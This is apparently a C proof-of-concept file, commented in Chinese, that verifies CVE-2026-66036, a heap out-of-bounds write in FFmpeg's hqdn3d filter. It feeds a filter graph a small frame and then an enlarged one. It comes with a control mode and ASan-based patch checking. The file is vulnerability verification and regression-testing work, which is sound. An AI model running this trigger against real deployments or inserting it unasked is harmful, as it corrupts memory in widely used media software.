/*
 * CVE-2026-66036 运行验证 PoC — third_party/ffmpeg vf_hqdn3d 堆越界写
 *
 * 等价性：OH third_party_ffmpeg(0a0c4dd33c) 的 libavfilter/vf_hqdn3d.c
 * 为 n7.1.1 版本结构（无 s->format/width/height 跟踪、无变尺寸防御；
 * 上游 master 在 7.1.1 后曾加入 EINVAL 防御、2026-07-22 5d7112c 改为
 * 动态尺寸支持）。本 PoC 在上游 n7.1.1 构建上执行（assert-level=0，
 * 即 oss-fuzz 同款断言关闭条件），结论直接代表 OH 组件。
 *
 * 触发原理：config_input 按 link 初始宽度 av_malloc_array(inlink->w)
 * 分配去噪行缓冲 s->line[]；do_denoise 以帧自身尺寸
 * (AV_CEIL_RSHIFT(in->width/h,...)) 跑 denoise()——帧尺寸增大时
 * 行缓冲按新宽度写入，堆越界写。ff_filter_frame 对非白名单滤镜的
 * av_assert1 尺寸断言在 assert-level=0 下不拦截（上游修复 5d7112c
 * 将 hqdn3d 加入白名单并支持动态尺寸，正为此场景）。
 *
 * 用法：./poc_hqdn3d trigger|control
 *   trigger: 先 64x64 后 512x512 两帧 YUV420P
 *   control: 两帧均 64x64
 * 判读：ASan 下原版构建 trigger 报 heap-buffer-overflow（漏洞观测）；
 *       补丁版（窄化 EINVAL 防御）trigger 报错返回不越界；control
 *       两侧均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavfilter/avfilter.h>
#include <libavfilter/buffersink.h>
#include <libavfilter/buffersrc.h>
#include <libavutil/frame.h>
#include <libavutil/opt.h>
#include <libavutil/pixfmt.h>

static int push_frame(AVFilterContext *src, int w, int h, int fill)
{
    AVFrame *f = av_frame_alloc();
    if (!f) return -1;
    f->format = AV_PIX_FMT_YUV420P;
    f->width = w;
    f->height = h;
    if (av_frame_get_buffer(f, 32) < 0) { av_frame_free(&f); return -1; }
    for (int p = 0; p < 4 && f->data[p]; p++) {
        int rows = (p == 1 || p == 2) ? (h + 1) / 2 : h;   /* YUV420P 色度半高 */
        memset(f->data[p], fill, (size_t)rows * f->linesize[p]);
    }
    int ret = av_buffersrc_add_frame(src, f);
    av_frame_free(&f);
    return ret;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "usage: %s trigger|control\n", argv[0]); return 2; }
    int trigger = !strcmp(argv[1], "trigger");
    if (!trigger && strcmp(argv[1], "control")) { fprintf(stderr, "bad mode\n"); return 2; }

    char graph[] =
        "buffer=video_size=64x64:pix_fmt=yuv420p:time_base=1/25,"
        "hqdn3d,buffersink";

    AVFilterGraph *g = avfilter_graph_alloc();
    AVFilterInOut *in = NULL, *out = NULL;
    if (avfilter_graph_parse_ptr(g, graph, &in, &out, NULL) < 0) {
        fprintf(stderr, "FAIL: graph parse\n"); return 2;
    }
    if (avfilter_graph_config(g, NULL) < 0) {
        fprintf(stderr, "FAIL: graph config\n"); return 2;
    }
    AVFilterContext *src = NULL, *sinkc = NULL;
    for (unsigned i = 0; i < g->nb_filters && !(src && sinkc); i++) {
        const char *n = g->filters[i]->filter->name;
        if (!src && !strcmp(n, "buffer")) src = g->filters[i];
        else if (!sinkc && !strcmp(n, "buffersink")) sinkc = g->filters[i];
    }
    if (!src || !sinkc) { fprintf(stderr, "FAIL: src/sink\n"); return 2; }

    int r1 = push_frame(src, 64, 64, 0x80);

    AVFrame *drain = av_frame_alloc();
    while (av_buffersink_get_frame(sinkc, drain) >= 0) av_frame_unref(drain);
    av_frame_free(&drain);

    int r2 = trigger ? push_frame(src, 512, 512, 0xC0)
                     : push_frame(src, 64, 64, 0xC0);

    AVFrame *sink = av_frame_alloc();
    int pulled = 0, ret;
    while ((ret = av_buffersink_get_frame(sinkc, sink)) >= 0) {
        pulled++;
        av_frame_unref(sink);
    }
    av_frame_free(&sink);

    printf("CASE_DONE mode=%s push1=%d push2=%d pulled=%d\n",
           trigger ? "trigger" : "control", r1, r2, pulled);

    avfilter_inout_free(&in);
    avfilter_inout_free(&out);
    avfilter_graph_free(&g);
    return 0;
}
